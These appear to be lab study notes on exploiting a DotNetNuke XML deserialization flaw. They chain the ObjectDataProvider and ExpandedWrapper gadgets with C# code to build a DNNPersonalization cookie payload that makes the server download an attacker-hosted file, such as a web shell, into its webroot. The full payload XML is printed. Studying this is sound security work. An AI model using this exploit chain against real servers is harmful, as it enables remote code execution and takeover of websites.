# Payload Options

Payload object needs to:

1. Execute code that we can use for our purposes
2. Present in one of the assemblies loaded by DNN
3. Needs to be serializable through `XMLSerializer` class
4. Serialized with appropriate XML format that vulnerable `DeSerializeHashtable`function accepts

## PullFile Method

To search for a file, we go to `File -> Search Assemblies` and search for the PullFile util. 

The `DotNetNuke.dll` assembly contains a class called `FileSystemUtils` (within the module `DotNetNuke.Common.Utilities`), which implements a method called PullFile. Triggering this method theoretically allows us to download an arbitrary file into the file system (for instance an ASPX shell). However, the main limitation of XmlSerializer is that it **cannot serialize class methods**, only serializing **public** properties and fields. 

```java
public static string PullFile (string URL, string FilePath){
	string result = "";
	try{
		WebClient webClient = new WebClient();
		webClient.DownloadFile(URL, FilePath);
	}catch (Exception ex){
		FileSystemUtils.Logger.Error(ex);
		result = ex.Message;
	}
	return result;
}
```

## ObjectDataProvider Class

.NET deserialization **gadgets** are classes that facilitate malicious activities during the user-controlled deserialization process. **ObjectDataProvider** gadget is most versatile of 4 .NET deserialization gadgets/classes that can facilitate malicious activities during user-controlled deserialization process. 

The ObjectDataProvider gadget allows us to wrap an arbitrary object and use the `MethodName` property to **call a method** from a wrapped object, along with the `MethodParameters` property to pass any necessary parameters to the function specified in `MethodName`. With ObjectDataProvider **properties**, we can trigger method calls in a completely different object. 

- We can use the ObjectDataProvider to trigger invocations of methods in completely **different** classes. This also bypasses the **limitations** of hte XMLSerializer, which had the limitation that it can’t serialize class methods.
- In this case, if we use ODP to wrap a `FileSystemUtils` object, we would be able to trigger the `PullFile` method to download a file onto the file system.

### Code Examination

The ObjectDataProvider class is found within the `System.Window.Namespace` of thePresentationFramework dll in the directory `C:\Windows\Microsoft.NET\Framework64\v<>\WPF` 

(Source: [Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net) | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net))

Looking at the code for the setting of method name, the **private** `_methodName` variable is set and the `base.Refresh` function takes place. This traces back to the `BeginQuery` function, which seems to be a dead end. 

```java
public void set_MethodName(string value)
{
	this._methodName = value;
	this.OnPropertyChanged("MethodName");
	if (!base.IsRefreshDeferred)
	{
		base.Refresh();
	}
}
```

However, due to inheritance, we should navigate to the `BeginQuery`function within the `ObjectDataProvider`class since that would override that of the `DataSourceProvider`. 

The ObjectDataProvider inherits from the DataSourceProvider class, which contains another call to the `QueryWorker` method. 

```java
protected override void BeginQuery()
{
	if (TraceData.IsExtendedTraceEnabled(this, TraceDataLevel.Attach))
	{
		TraceData.Trace(TraceEventType.Warning, TraceData.BeginQuery(new object[]
		{
			TraceData.Identify(this),
			this.IsAsynchronous ? "asynchronous" : "synchronous"
		}));
	}
	if (this.IsAsynchronous)
	{
		ThreadPool.QueueUserWorkItem(new WaitCallback(this.QueryWorker), null);
		return;
	}
	this.QueryWorker(null);
}
```

Tracing the QueryWorker method again, we find that it leads to an `InvokeMethodOnInstance` on line 300, where the call to the wrapped object’s method eventually 

```java
Exception ex2 = null;
if (this._needNewInstance && this._mode == ObjectDataProvider.SourceMode.FromType)
{
	ConstructorInfo[] constructors = this._objectType.GetConstructors();
	if (constructors.Length != 0)
	{
		this._objectInstance = this.CreateObjectInstance(out ex2);
	}
	this._needNewInstance = false;
}
if (string.IsNullOrEmpty(this.MethodName))
{
	obj2 = this._objectInstance;
}
else
{
	obj2 = this.InvokeMethodOnInstance(out ex);
	if (ex != null && ex2 != null)
	{
		ex = ex2;
	}
}
```

### Demonstration (Test Application)

The following code uses ODP to demonstrate a Pull file against our Kali machine. We initialize it as a `.sln` file and compile into executable with VS Code. 

```java
using System;
using System.IO;
using DotNetNuke.Common.Utilities;
using System.Windows.Data;
using System.Collections;

namespace ODPSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            ObjectDataProvider myODP = new ObjectDataProvider();
            myODP.ObjectInstance = new FileSystemUtils();
            myODP.MethodName = "PullFile";
            myODP.MethodParameters.Add("http://192.168.45.184/test.txt");
            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
            Console.WriteLine("Done!");
        }
    }
}
```

Once compiled, we simply run the executable in dnSpy. 

We set a breakpoint on the `InvokeMethodOnInstance` function call in the ODP object, and then execute our function. This breakpoint is hit 3 times — once for each of the method invocations (to set method name and then add the 2 parameters. After which, we should see the web request appear in our terminal window.

- Note that in this lab, since iwr is dependent on Internet explorer, we need to keep burpsuite running since proxy is enabled

## Creating Payload

DNNPersonalization cookie payload has to be in XML format. It has to contain the profile node along with the item tag, which contains a “type” attribute describing enclosed object. Instead of trying to manually re-construct the structure, can re-use the DNN function that creates the cookie value. This function is called `SerializeDictionary` in the `DNN.Common.Utilities.XmlUtils` namespace. 

As such, we adjust our malicious application to make a call to the `SerializeDictionary` function. Ou function creates a hash table with our malicious ODP object, then uses SerializeDictionary to generate the string payload for our cookie. It then saves this to a file. However, we receive an unhanded exception when we execute with DnSpy.

```java
public static string SerializeDictionary(IDictionary source, string rootName)
		{
			string result;
			if (source.Count != 0)
			{
				XmlDocument xmlDocument = new XmlDocument();
				XmlElement xmlElement = xmlDocument.CreateElement(rootName);
				xmlDocument.AppendChild(xmlElement);
				foreach (object obj in source.Keys)
				{
					XmlElement xmlElement2 = xmlDocument.CreateElement("item");
					xmlElement2.SetAttribute("key", Convert.ToString(obj));
					xmlElement2.SetAttribute("type", source[obj].GetType().AssemblyQualifiedName);
					XmlDocument xmlDocument2 = new XmlDocument();
					XmlSerializer xmlSerializer = new XmlSerializer(source[obj].GetType());
					StringWriter stringWriter = new StringWriter();
					xmlSerializer.Serialize(stringWriter, source[obj]);
					xmlDocument2.LoadXml(stringWriter.ToString());
					xmlElement2.AppendChild(xmlDocument.ImportNode(xmlDocument2.DocumentElement, true));
					xmlElement.AppendChild(xmlElement2);
				}
				result = xmlDocument.OuterXml;
			}
			else
			{
				result = "";
			}
			return result;
		}
```

To debug this, we can let the stack trace the line failure and then open the `innerException` object to view the error message. It gives us the following message. This states that the serializer did not expect the `FileSystemUtils` instance. 

```java
"The type DotNetNuke.Common.Utilities.FileSystemUtils was not expected. Use the XmlInclude or SoapInclude attribute to specify types that are not known statically."
```

In our `SerializeDictionary` function, our object is created using whatever type comes out of `sourcce[obj].GetType()`. Since we pass ODP instance, XMLSerializer expects this type, rather than the `FileSystemUtils` object that is wrapped. As such, we need a **different wrapper class**. 

## ExpandedWrapper Class

The `ExpandedWrapper` class can be used to finalize the construction of a malicious payload. The EW provides a base class that implements **projections**, a mechanism that an object is transformed into a different form. As such data providers are able to create objects of arbitrary types to encapsulate data retrieved with expansions and projections. In essence, we use this class to wrap our ODP object into a new type and provide the properties needed (Method name and parameters), which is assigned to the EW instance properties and allow them to be serialized by XmlSerializer. 

```java
ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
myExpWrap.ProjectedProperty0.MethodName = "PullFile";
myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.119.7/myODPTest.txt");
myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");

Hashtable table = new Hashtable();
table["myTableEntry"] = myExpWrap;
String payload = XmlUtils.SerializeDictionary(table, "profile");
TextWriter writer = new StreamWriter("C:\\Users\\Public\\ExpWrap.txt");
writer.Write(payload);
writer.Close();

Console.WriteLine("Done!");
```

Our payload is written into the Users Public directory

```xml
<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.45.184/test.txt</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```

To test that our code can deserialize, we write a simple code that takes in the XML and deserializes it.

```java
public static void Deserialize() {
    string xmlSource = System.IO.File.ReadAllText("C:\\Useres\\Public\\ExpWrap.txt");
    Globals.DeserializeHashTableXml(xmlSource);
}
```